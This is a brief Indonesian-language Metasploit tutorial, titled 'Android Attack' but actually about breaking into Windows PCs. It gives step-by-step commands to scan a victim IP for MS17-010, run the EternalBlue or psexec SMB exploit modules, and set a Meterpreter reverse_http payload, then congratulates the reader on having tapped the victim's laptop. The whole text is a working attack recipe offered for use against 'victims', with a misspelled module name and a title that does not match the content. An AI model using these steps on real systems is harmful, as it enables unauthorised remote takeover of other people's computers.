# Metasploit

# Android Attack 

![image.png]( {https://bahrunsyah.xyz} ) 
> $sudo apt update

> $sudo apt upgrade

> $ifconfig (untuk mengetahui ip)

> $sudo su (masuk ke menu root)

Jalankan Tools

> #msfconsole

kemudian ketikan perintah 

> #search smb

> #use auxiliary/scanner/smb/smb_sm17_010

> #set RHOSTS (ip korban)

> #run

> #use exploit/windows/smb/ms17_010_eternalblue (JIKA KORBAN MENGGUNAKAN WINDOW 7)

> #use exploit/windows/smb/ms17_010_psexec (JIKA KORBAN MENGGUNAKAN WINDOW 7+)

> #set payload windows/meterpreter/reverse_http

> #exploit

END BOOOMMM!

> #? (untuk melihat menu perintah apa saja yang dapat dilakukan)

selamat kamu telah menyadap laptop target/korban mu :)
